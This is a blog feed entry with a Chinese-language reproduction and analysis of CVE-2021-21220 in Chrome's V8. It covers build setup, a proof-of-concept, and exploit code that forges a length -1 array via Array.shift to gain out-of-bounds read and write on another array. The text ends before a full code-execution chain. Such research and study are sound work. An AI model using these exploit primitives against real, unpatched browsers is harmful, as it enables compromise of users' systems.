<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://tangzichengcc.github.io</id>
    <title>唐仔橙 • Posts by &#34;浏览器安全&#34; tag</title>
    <link href="https://tangzichengcc.github.io" />
    <updated>2022-11-17T14:20:59.000Z</updated>
    <category term="旅游" />
    <category term="浏览器安全" />
    <category term="路由器" />
    <category term="csapp" />
    <category term="C语言" />
    <category term="PWN入门" />
    <category term="堆" />
    <category term="docker" />
    <category term="脚本" />
    <category term="研究生课程" />
    <category term="诗歌" />
    <category term="调试" />
    <category term="论文" />
    <category term="KVM" />
    <category term="USENIX" />
    <entry>
        <id>https://tangzichengcc.github.io/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</id>
        <title>CVE-2021-21220 Chrome v8远程代码执行漏洞复现与分析</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
        <content type="html">&lt;h1 id=&#34;tips&#34;&gt;&lt;a href=&#34;#tips&#34; class=&#34;headerlink&#34; title=&#34;tips:&#34;&gt;&lt;/a&gt;tips:&lt;/h1&gt;&lt;p&gt;标记为橙色的为不严谨,有待研究&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;V8-漏洞利用之环境搭建&#34;&gt;&lt;a href=&#34;#V8-漏洞利用之环境搭建&#34; class=&#34;headerlink&#34; title=&#34;V8 漏洞利用之环境搭建&#34;&gt;&lt;/a&gt;&lt;strong&gt;&lt;strong&gt;V8 漏洞利用之环境搭建&lt;/strong&gt;&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&#34;一、编译环境搭建&#34;&gt;&lt;a href=&#34;#一、编译环境搭建&#34; class=&#34;headerlink&#34; title=&#34;一、编译环境搭建&#34;&gt;&lt;/a&gt;一、编译环境搭建&lt;/h2&gt;&lt;p&gt;以下都出自这篇文章:&lt;a href=&#34;https://zhuanlan.zhihu.com/p/493674086&#34;&gt;https://zhuanlan.zhihu.com/p/493674086&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;更新软件列表、更新软件、安装依赖&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt-get update&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt-get upgrade&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt install bison cdbs curl flex g++ git python vim pkg-config&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;安装depot_tools&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mkdir /root/tools &amp;amp;&amp;amp; cd /root/tools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git clone https:&lt;span class=&#34;comment&#34;&gt;//chromium.googlesource.com/chromium/tools/depot_tools.git /root/tools/depot_tools&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &lt;span class=&#34;string&#34;&gt;&amp;#x27;export PATH=$PATH:&amp;quot;/root/tools/depot_tools&amp;quot;&amp;#x27;&lt;/span&gt; &amp;gt;&amp;gt; /etc/profile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &lt;span class=&#34;string&#34;&gt;&amp;#x27;export PATH=$PATH:&amp;quot;/root/tools/depot_tools&amp;quot;&amp;#x27;&lt;/span&gt; &amp;gt;&amp;gt; ~/.bashrc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;source /etc/profile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;source ~/.bashrc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;安装ninja：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;git clone https:&lt;span class=&#34;comment&#34;&gt;//github.com/ninja-build/ninja.git&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd ninja &amp;amp;&amp;amp; ./configure.py --bootstrap &amp;amp;&amp;amp; cd ..&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &lt;span class=&#34;string&#34;&gt;&amp;#x27;export PATH=$PATH:&amp;quot;$(pwd)/ninja&amp;quot;&amp;#x27;&lt;/span&gt; &amp;gt;&amp;gt; ~/.bashrc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;下载v8&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mkdir /root/v8 &amp;amp;&amp;amp; cd /root/v8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fetch v8  #这个可能会花很长时间，取决于个人的网络环境，如果中断了则 gclient sync同步&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd v8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo ./build/install-build-deps.sh --no-chromeos-fonts	# 在linux系统中这个命令是需要的&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;二、找漏洞版本commit&#34;&gt;&lt;a href=&#34;#二、找漏洞版本commit&#34; class=&#34;headerlink&#34; title=&#34;二、找漏洞版本commit&#34;&gt;&lt;/a&gt;二、找漏洞版本commit&lt;/h2&gt;&lt;p&gt;编译的话,需要找到漏洞版本的github的commit&lt;/p&gt;
&lt;p&gt;受影响的Chrome最高版本为：&lt;code&gt;89.0.4389.114&lt;/code&gt;受影响的V8最高版本为：&lt;code&gt;8.9.255.24&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;方法一&#34;&gt;&lt;a href=&#34;#方法一&#34; class=&#34;headerlink&#34; title=&#34;方法一&#34;&gt;&lt;/a&gt;方法一&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://omahaproxy.appspot.com/&#34;&gt;https://omahaproxy.appspot.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;通过这个网站可以找漏洞版本的commit&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled_1.png&#34; alt=&#34;Untitled_1&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;方法二&#34;&gt;&lt;a href=&#34;#方法二&#34; class=&#34;headerlink&#34; title=&#34;方法二&#34;&gt;&lt;/a&gt;方法二&lt;/h3&gt;&lt;p&gt;从漏洞的issue链接&lt;a href=&#34;https://bugs.chromium.org/p/chromium/issues/detail?id=821137&#34;&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=821137&lt;/a&gt;&lt;br&gt;找到修复的commit链接&lt;a href=&#34;https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d&#34;&gt;https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d&lt;/a&gt; ,可以看到漏洞信息、存在漏洞的上一个版本（parent）、diff修复信息和漏洞poc&lt;/p&gt;
&lt;h3 id=&#34;方法三&#34;&gt;&lt;a href=&#34;#方法三&#34; class=&#34;headerlink&#34; title=&#34;方法三&#34;&gt;&lt;/a&gt;方法三&lt;/h3&gt;&lt;p&gt;直接从github找commit&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/v8/v8/tags?after=8.9.255&#34;&gt;https://github.com/v8/v8/tags?after=8.9.255&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;三、编译&#34;&gt;&lt;a href=&#34;#三、编译&#34; class=&#34;headerlink&#34; title=&#34;三、编译&#34;&gt;&lt;/a&gt;三、编译&lt;/h2&gt;&lt;p&gt;分了两个版本,一个是release,一个是debug&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;进入到v8目录,选择好要编译的commit(不然默认编译最新的)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gclient sync # 同步更新&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 编译可执行文件 (二选一)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tools/dev/v8gen.py x64.debug&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ninja -C out.gn/x64.debug d8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;上面和下面是二选一&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tools/dev/v8gen.py x64.relase&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ninja -C out.gn/x64.relase d8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这里有个坑,就是,debug版本会有很多调试信息,release没有,并且,release不能使用v8的gdb脚本(如job命令),如果想要release能使用gdb脚本的话,需要执行完&lt;code&gt;tools/dev/v8gen.py x64.release&lt;/code&gt;后在生成的 &lt;code&gt;out.gn/x64.release/args.gn&lt;/code&gt;中追加&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;v8_enable_backtrace = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;v8_enable_disassembler = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;v8_enable_object_print = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;v8_enable_verify_heap = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;参考:&lt;a href=&#34;https://www.cjovi.icu/CVE/1586.html&#34;&gt;https://www.cjovi.icu/CVE/1586.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;四、配置v8自带的gdb脚本-方便调试&#34;&gt;&lt;a href=&#34;#四、配置v8自带的gdb脚本-方便调试&#34; class=&#34;headerlink&#34; title=&#34;四、配置v8自带的gdb脚本,方便调试&#34;&gt;&lt;/a&gt;四、配置v8自带的gdb脚本,方便调试&lt;/h2&gt;&lt;p&gt;v8自带了gdb调试脚本&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled_2.png&#34; alt=&#34;Untitled_2&#34;&gt;&lt;/p&gt;
&lt;p&gt;1.把v8&amp;#x2F;tools&amp;#x2F;gdbinit内容加到~&amp;#x2F;.gdbint里面&lt;/p&gt;
&lt;p&gt;2.将v8&amp;#x2F;tools&amp;#x2F;gdb-v8-support.py放到一个目录(当前也行)&lt;/p&gt;
&lt;p&gt;在~&amp;#x2F;.gdbint开头加入 &lt;code&gt;source /自定义目录/gdb-v8-support.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;参考:&lt;a href=&#34;https://paper.seebug.org/1821/&#34;&gt;https://paper.seebug.org/1821/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;RCE的完整步骤&#34;&gt;&lt;a href=&#34;#RCE的完整步骤&#34; class=&#34;headerlink&#34; title=&#34;RCE的完整步骤&#34;&gt;&lt;/a&gt;RCE的完整步骤&lt;/h1&gt;&lt;h2 id=&#34;incorrect-numeric-理解漏洞本身&#34;&gt;&lt;a href=&#34;#incorrect-numeric-理解漏洞本身&#34; class=&#34;headerlink&#34; title=&#34;incorrect numeric (理解漏洞本身)&#34;&gt;&lt;/a&gt;incorrect numeric (理解漏洞本身)&lt;/h2&gt;&lt;p&gt;POC&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; _arr = new Uint32Array([&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;**&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function &lt;span class=&#34;title function_&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(a)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var x = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    x = (_arr[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] ^ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    x = Math.&lt;span class=&#34;built_in&#34;&gt;abs&lt;/span&gt;(x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    x -= &lt;span class=&#34;number&#34;&gt;2147483647&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    x = Math.max(x, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    x -= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(x==&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;) x = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var arr = new Array(x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    arr.shift();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var cor = [&lt;span class=&#34;number&#34;&gt;1.1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1.2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1.3&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; [arr, cor];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/1850/&#34;&gt;https://paper.seebug.org/1850/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/1556/&#34;&gt;https://paper.seebug.org/1556/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;那么 这个长度-1的数组有什么用呢??????,见下面 Array.shift&lt;/p&gt;
&lt;h2 id=&#34;OOB-out-of-bounds-memory-access-越界访问&#34;&gt;&lt;a href=&#34;#OOB-out-of-bounds-memory-access-越界访问&#34; class=&#34;headerlink&#34; title=&#34;OOB (out-of-bounds memory access) 越界访问&#34;&gt;&lt;/a&gt;OOB (out-of-bounds memory access) 越界访问&lt;/h2&gt;&lt;p&gt;abusing array bounds check elimination.&lt;/p&gt;
&lt;p&gt;有历史沿革,之前是&lt;a href=&#34;https://chromium.googlesource.com/v8/v8.git/+/7bb6dc0e06fa158df508bc8997f0fce4e33512a5&#34;&gt;bounds-check elimination&lt;/a&gt;的问题,后来去掉了,但又有新的利用方式&lt;/p&gt;
&lt;h3 id=&#34;利用Array-shift实现oob&#34;&gt;&lt;a href=&#34;#利用Array-shift实现oob&#34; class=&#34;headerlink&#34; title=&#34;利用Array.shift实现oob&#34;&gt;&lt;/a&gt;利用Array.shift实现oob&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://bugs.chromium.org/p/chromium/issues/detail?id=1198696&#34;&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=1198696&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;而负长度被视为一个正的大长度,因此该数组允许访问任意 OOB 数据。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;function &lt;span class=&#34;title function_&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(a)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        let x = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (a) x = &lt;span class=&#34;number&#34;&gt;0xFFFFFFFF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        var arr = new Array(Math.sign(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; - Math.max(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, x, &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;)));&lt;span class=&#34;comment&#34;&gt;//构造长度为-1的数组&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        arr.shift();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        let local_arr = Array(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        console.&lt;span class=&#34;built_in&#34;&gt;log&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;现在长度&amp;quot;&lt;/span&gt;+arr.length)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        local_arr[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;number&#34;&gt;5.1&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;//4014666666666666&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        let buff = new LeakArrayBuffer(&lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//byteLength idx=8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        arr[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;number&#34;&gt;0x1122&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;//&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; [arr, local_arr, buff];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (var i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;0x10000&lt;/span&gt;; ++i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        foo(&lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gc(); gc(); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    [corrput_arr, rwarr, corrupt_buff] = foo(&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		corrput_arr[&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;] = &lt;span class=&#34;number&#34;&gt;0x22444&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		delete corrput_arr;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;  通过上述漏洞,我们实现了一个长度为-1的数组arr(corrput_arr),-1扩展为无符号,就是0xffffffff,是一个很大的正数,从而可以实现越界读写,在此基础之上,进行后面的利用&lt;/p&gt;
&lt;p&gt;  1.获得了一个0xfffffff(-1长度)数组 arr(corrput_arr)&lt;/p&gt;
&lt;p&gt;  2.声明一个local_arr(rwarr),长度为2, 接着利用arr的oob,溢出修改它的长度为0x22444,也就是corrput_arr[12] &amp;#x3D; 0x22444; (或者说 arr[12] &amp;#x3D; 0x22444;) 这一位对应的是数组的长度&lt;/p&gt;
&lt;p&gt;  3.声明长度为0x1000的ArrayBuffer(corrupt_buff)&lt;/p&gt;
